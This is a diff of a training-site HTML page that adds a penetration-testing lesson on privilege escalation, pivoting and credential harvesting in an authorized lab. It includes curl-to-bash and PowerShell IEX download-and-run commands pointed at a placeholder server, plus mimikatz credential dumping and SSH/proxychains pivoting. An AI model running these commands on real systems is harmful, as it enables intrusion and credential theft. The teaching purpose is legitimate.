@@ -1316,6 +1316,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    01 · Advanced Penetration Testing
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1332,6 +1350,113 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-why-chaining-matters-more-than-single-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Why chaining matters more than single findings
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-privilege-escalation-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Privilege escalation — Linux
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-privilege-escalation-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Privilege escalation — Windows
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-lateral-movement-and-pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Lateral movement and pivoting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-credential-harvesting-along-the-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Credential harvesting along the chain
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-documenting-an-attack-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Documenting an attack chain
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-terms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key terms
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exercise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exercise
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -1991,6 +2116,102 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-why-chaining-matters-more-than-single-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Why chaining matters more than single findings
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-privilege-escalation-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Privilege escalation — Linux
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-privilege-escalation-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Privilege escalation — Windows
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-lateral-movement-and-pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Lateral movement and pivoting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-credential-harvesting-along-the-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Credential harvesting along the chain
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-documenting-an-attack-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Documenting an attack chain
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-terms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key terms
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exercise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exercise
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2010,8 +2231,150 @@
 
 
 <h1 id="01-advanced-penetration-testing">01 · Advanced Penetration Testing<a class="headerlink" href="#01-advanced-penetration-testing" title="Permanent link">&para;</a></h1>
-<p>This module is part of Level 3 · Advanced.</p>
-<p>More lessons are on the way — check back soon.</p>
+<p>Level 2 Module 9 covered the standard pentest methodology end to end.
+This module goes deeper into techniques used once initial access is
+gained — lateral movement, privilege escalation, and pivoting — the
+skills that separate "found one vulnerability" from "demonstrated the
+real business impact of a breach chain," all against a legal, purpose-
+built lab.</p>
+<div class="admonition warning">
+<p class="admonition-title">Authorized lab only</p>
+<p>Everything here uses <strong>HackTheBox/TryHackMe-style intentionally
+vulnerable machines</strong> or a local multi-VM lab you control (e.g.
+Metasploitable2 plus a second pivot-target VM on an isolated
+host-only network). Never chain these techniques against real
+infrastructure without explicit written authorization.</p>
+</div>
+<h2 id="1-why-chaining-matters-more-than-single-findings">1. Why chaining matters more than single findings<a class="headerlink" href="#1-why-chaining-matters-more-than-single-findings" title="Permanent link">&para;</a></h2>
+<p>A single medium-severity misconfiguration is often dismissed. The same
+misconfiguration as step one of a proven chain to full domain compromise
+gets fixed immediately — this is the entire value proposition of advanced
+pentesting over automated scanning: <strong>proving realistic attack paths</strong>,
+not just listing isolated issues.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Low-priv web shell → local privilege escalation → credential harvest →
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>  lateral movement to a second host → repeat → domain admin
+</code></pre></div>
+<h2 id="2-privilege-escalation-linux">2. Privilege escalation — Linux<a class="headerlink" href="#2-privilege-escalation-linux" title="Permanent link">&para;</a></h2>
+<p>After gaining an initial low-privilege shell (e.g. via a web app RCE in a
+lab), the next question is always "how do I become root/a more valuable
+user":</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Automated enumeration -- run first, always</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://YOUR_HTTP_SERVER/linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># Manual checks these scripts automate:</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>sudo<span class="w"> </span>-l<span class="w">                                    </span><span class="c1"># what can this user sudo, without a password?</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w">     </span><span class="c1"># SUID binaries (recap: Level 2 Module 3)</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.d/<span class="w">      </span><span class="c1"># scheduled jobs running as root?</span>
+</code></pre></div>
+<p>A classic finding: a cron job running as root that executes a
+world-writable script — editing that script grants root on next run.
+This is exactly the class of finding Level 2 Module 3's hardening
+checklist exists to prevent.</p>
+<h2 id="3-privilege-escalation-windows">3. Privilege escalation — Windows<a class="headerlink" href="#3-privilege-escalation-windows" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Automated enumeration</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'http://YOUR_HTTP_SERVER/PowerUp.ps1'</span><span class="p">)</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">Invoke-AllChecks</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c"># Manual checks:</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>                       <span class="c"># dangerous privileges assigned to this token?</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span>        <span class="c"># scheduled tasks, and what runs them</span>
+</code></pre></div>
+<p><code>SeImpersonatePrivilege</code> present on a service account, for example, is a
+well-known path to SYSTEM via "potato"-family techniques — a finding
+that's meaningless in isolation but critical as a chain step.</p>
+<h2 id="4-lateral-movement-and-pivoting">4. Lateral movement and pivoting<a class="headerlink" href="#4-lateral-movement-and-pivoting" title="Permanent link">&para;</a></h2>
+<p>Once you control one host, a lab network often has other hosts only
+reachable <em>from</em> that host (simulating a segmented internal network):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Set up a pivot via SSH local/dynamic port forwarding</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">1080</span><span class="w"> </span>user@compromised-host
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># Route further tool traffic (nmap, curl) through the SOCKS proxy</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>proxychains<span class="w"> </span>nmap<span class="w"> </span>-sT<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.10.0/24
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Metasploit's built-in pivoting via a session's route</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>route<span class="w"> </span>add<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span><span class="m">1</span>
+</code></pre></div>
+<p>This is the technical mechanism behind "the attacker got into a low-
+value marketing server, and three hops later was in the finance
+database" — a pattern found in real breach post-mortems, and exactly
+why network segmentation (Level 4 Module 3) is a critical control.</p>
+<h2 id="5-credential-harvesting-along-the-chain">5. Credential harvesting along the chain<a class="headerlink" href="#5-credential-harvesting-along-the-chain" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Linux: look for cleartext creds in config files, history, memory</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>grep<span class="w"> </span>-ri<span class="w"> </span><span class="s2">"password"</span><span class="w"> </span>/var/www/*/config*<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>cat<span class="w"> </span>~/.bash_history
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Windows: dump credentials from memory (only in an authorized lab --</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># this is exactly what Credential Guard, Level 2 Module 4, defends against)</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>mimikatz<span class="w"> </span><span class="c1"># sekurlsa::logonpasswords</span>
+</code></pre></div>
+<p>Every credential found this way should be tested against <em>other</em> hosts in
+the lab — password reuse across systems is one of the most common,
+highest-impact real-world findings.</p>
+<h2 id="6-documenting-an-attack-chain">6. Documenting an attack chain<a class="headerlink" href="#6-documenting-an-attack-chain" title="Permanent link">&para;</a></h2>
+<p>A chain-level finding is written differently than a single vulnerability:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Attack Path: Web Shell to Domain Compromise
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Steps:
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>  1. RCE via unpatched CMS plugin (web-01) -&gt; low-priv shell (www-data)
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>  2. World-writable root cron job (web-01) -&gt; privilege escalation to root
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>  3. Cleartext DB credential in /var/www/config.php -&gt; reused on db-01
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>  4. db-01 local admin password identical to workstation fleet (LAPS
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>     absent) -&gt; lateral movement to fin-ws-04
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>  5. Cached domain admin credential on fin-ws-04 -&gt; full domain compromise
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>Root causes: unpatched software, poor file permissions, credential reuse,
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>  no LAPS deployment, overprivileged cached credentials
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>Single-point fix that breaks the whole chain: any one of steps 2-5 --
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>  recommend prioritizing LAPS deployment (breaks step 4) as highest ROI
+</code></pre></div>
+<p>Identifying the <strong>highest-leverage single fix</strong> that breaks the whole
+chain (rather than listing five equal-priority fixes) is the mark of a
+senior-level pentest report.</p>
+<h2 id="key-terms">Key terms<a class="headerlink" href="#key-terms" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Privilege escalation</strong></td>
+<td>Gaining higher-level access than initially obtained</td>
+</tr>
+<tr>
+<td><strong>Lateral movement</strong></td>
+<td>Moving from one compromised host to another within a network</td>
+</tr>
+<tr>
+<td><strong>Pivoting</strong></td>
+<td>Using a compromised host as a relay to reach otherwise-unreachable networks</td>
+</tr>
+<tr>
+<td><strong>Attack chain / kill chain</strong></td>
+<td>The full sequence of steps from initial access to ultimate objective</td>
+</tr>
+<tr>
+<td><strong>Password reuse</strong></td>
+<td>Using the same credential across multiple systems/accounts</td>
+</tr>
+<tr>
+<td><strong>SOCKS proxy</strong></td>
+<td>A relay allowing arbitrary traffic to be routed through a compromised host</td>
+</tr>
+</tbody>
+</table>
+<h2 id="exercise">Exercise<a class="headerlink" href="#exercise" title="Permanent link">&para;</a></h2>
+<ol>
+<li>In an isolated lab, gain an initial low-privilege shell on a vulnerable
+   VM (reuse Metasploitable2 or a HackTheBox-style retired lab machine).</li>
+<li>Run an automated enumeration script and identify at least one
+   privilege escalation path; execute it and confirm root/SYSTEM.</li>
+<li>Search the compromised host for any credentials in config files or
+   history and note where they might be reused.</li>
+<li>If your lab has a second VM, set up SSH pivoting and reach it from
+   your first foothold.</li>
+<li>Write a chain-level finding using the section 6 template, including
+   identifying the single highest-leverage fix.</li>
+</ol>
 
 
 
